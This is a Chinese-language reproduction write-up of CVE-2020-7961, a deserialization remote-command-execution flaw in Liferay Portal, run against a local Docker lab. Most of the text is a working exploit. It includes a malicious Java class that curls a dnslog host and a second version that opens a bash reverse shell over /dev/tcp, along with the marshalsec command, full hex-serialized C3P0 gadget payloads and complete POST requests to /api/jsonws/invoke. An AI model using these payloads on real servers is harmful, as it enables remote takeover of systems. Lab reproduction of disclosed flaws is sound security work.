> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jni6hoqMVjs5yzZpiBqkvw)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3Bm7ibTgI2xvQImjzGZicg4AxiazTkFa0ktibH6NzY6RznSbFGzsy69XBYPnw/640?wx_fmt=png)

(CVE-2020-7961)Liferay Portal RCE 反序列化命令执行漏洞

一、漏洞描述

Liferay Portal CE 是一款用来快速构建网站的开源系统。其 7.2.0 GA1 及以前的版本 API 接口中存在一处反序列化漏洞，利用该漏洞可在目标服务器上执行任意命令。

二、影响版本

Liferay Portal CE<V7.2.0 GA1

三、漏洞复现

执行如下命令启动 Liferay Portal 7.2.0 GA1：

```
docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmzHiaia2ugiaBo9U6AZ6nmiaSJaW7ayiaq0yRxTb5MFEuALE75j7PPh3vI5g/640?wx_fmt=png)

环境启动成功 (注意 docker 环境至少 2G)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmdI5CRjaujBRMrGQ8Vicbl8zyh8ljavSHGpAyiciaIqmo1IiaL0RXPCxMBQ/640?wx_fmt=png)

http://192.168.0.102:8080/

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3Bm7ibTgI2xvQImjzGZicg4AxiazTkFa0ktibH6NzY6RznSbFGzsy69XBYPnw/640?wx_fmt=png)

方法一：

恶意的 Java 类，编译

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp {

static {
    try {
            String[] cmd = {"bash", "-c", "curl 2jpa4i.dnslog.cn"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
```

在保存着 class 文件的目录下运行一个 HTTP 文件服务：  

先启动一个 http 服务：

```
python3 -m http.server 9999
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmII7AmyNyGu8AaSdPW8icAEyEuoicrYR2hb1ZkQsxeq5DOpK30jP1f7Pw/640?wx_fmt=png)  

因为目标 Java 版本较高，我们使用利用链是 com.mchange.v2.c3p0.WrapperConnectionPoolDataSource，借助 marshalsec 来生成一个适用于 Jackson 的 POC：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://192.168.0.104:9999/ LifExp
```

 其中，http://192.168.0.104:9999 / 是刚才启动的保存了恶意 class 文件的 Web 服务，LifExp 是恶意类名。  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmjASpjmp6BiaNwDxU3bu7FNV0B6qNq0g4CXb7FcRXClotCoaR3TV2ZNQ/640?wx_fmt=png)

生成的 POC

["com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e302e3130343a393939392f740003466f6f;"}]

生成的 Payload 是 Jackson 使用的，我们只需按照 Liferay Portal 的形式，即 + 参数名: 类名 = 值，来修改这个 Payload：

+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e302e3130343a393939392f740003466f6f;"}

将上述 Payload 合并到 HTTP 请求中发送：

POST /api/jsonws/invoke HTTP/1.1

Host: 192.168.0.102:8080

Content-Length: 1356

Content-Type: application/x-www-form-urlencoded

Connection: close

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e302e3130343a393939392f740003466f6f;"}

执行成功

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmdlqUM9LiaXCZs9O0R5xEKfOR5GYuG14EZgVk0aty3dxYKkNeeJibnUag/640?wx_fmt=png)

查看 DNS 访问记录

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmaXL5ysPnSibayjVGE66TpOwIOGzsAKBPfqtaTQheuzFvxib56bTUFnkA/640?wx_fmt=png)

方法二：

执行命令反弹：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp {

static {
    try {
            String[] cmd = {"bash", "-c", "bash -i >& /dev/tcp/XXXXXXX/34567 0>&1"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
```

获取新的 POC  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://192.168.0.104:9999/ LifExp
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3Bm1ibEp1gzUcuwVjEiajA6oRicZT3b7IDiaAwg8MKA89qE41YIABBnDSxM9w/640?wx_fmt=png)  

["com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e302e3130343a393939392f740003466f6f;"}]

数据访问包：

POST /api/jsonws/invoke HTTP/1.1

Host: 192.168.0.102:8080

Content-Length: 1352

Content-Type: application/x-www-form-urlencoded

Connection: close

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e302e3130343a393939392f740003466f6f;"}

执行完成

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmCuxodsuE9n3lakKY2ZbyRUutFC1rFbcuxCC8pHlOWuqngrkqcVKxpA/640?wx_fmt=png)

服务器监听漏洞获取权限

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfLTNCNKEp1FZ1icqm3hj3BmnJChWAdRxDzDnlxwSRluJ7vVIvHQp8qaKz5K0as2vtATfCemIOunbQ/640?wx_fmt=png)

参考：

http://www.dnslog.cn/

https://github.com/vulhub/vulhub/tree/master/liferay-portal/CVE-2020-7961

https://github.com/mzer0one/CVE-2020-7961-POC

https://github.com/b33p-b0x/CVE-2020-7961-payloads

